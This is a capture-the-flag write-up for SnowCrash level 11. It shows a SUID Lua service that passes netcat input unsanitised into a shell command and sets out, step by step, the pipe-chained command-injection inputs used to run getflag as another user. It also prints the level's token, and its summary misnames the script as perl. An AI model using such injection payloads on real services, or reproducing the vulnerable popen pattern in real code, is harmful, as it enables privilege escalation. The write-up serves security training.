# Level 11

## Summary

In this level, we have access to a SUID perl script that execute a shell command which use a nc user-provided element without sanitation, leading to command injection. We can exploit this vulnerability to read the token file owned by flag11.

## Workflow

1. List the files in the home directory. The binary is SUID and is ran as flag11.
    ```
    level11@SnowCrash:~$ ls -l
    total 4
    -rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua

    level11@SnowCrash:~$ getfacl level11.lua 
    # file: level11.lua
    # owner: flag11
    # group: level11
    # flags: ss-
    user::rwx
    group::r-x
    other::r-x
    ```

2. This script use an input password (from nc connection) to compute its sha1 hash and compare it to a hardcoded one. But the input of nc user is directly used in a shell command without sanitation, leading to command injection.
    ```
    level11@SnowCrash:~$ cat level11.lua 
    #!/usr/bin/env lua
    local socket = require("socket")
    local server = assert(socket.bind("127.0.0.1", 5151))

    function hash(pass)
    prog = io.popen("echo "..pass.." | sha1sum", "r")
    data = prog:read("*all")
    prog:close()

    data = string.sub(data, 1, 40)

    return data
    end


    while 1 do
    local client = server:accept()
    client:send("Password: ")
    client:settimeout(60)
    local l, err = client:receive()
    if not err then
        print("trying " .. l)
        local h = hash(l)

        if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
            client:send("Erf nope..\n");
        else
            client:send("Gz you dumb*\n")
        end

    end

    client:close()
    end
    ```

3. Connect to the level11 service using netcat and exploit the command injection vulnerability to test if the injection works.
    ```
    level11@SnowCrash:~$ nc 127.0.0.1 5151
    Password: oui | echo salut > /tmp/here | echo onsenfout
    Erf nope..
    level11@SnowCrash:~$ cat /tmp/here
    salut
    ```

4. Now we can use this vulnerability to read the token file owned by flag11.
    ```
    level11@SnowCrash:~$ nc 127.0.0.1 5151
    Password: oui | getflag > /tmp/flag | echo onsenfout
    Erf nope..
    level11@SnowCrash:~$ cat /tmp/flag
    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
    ```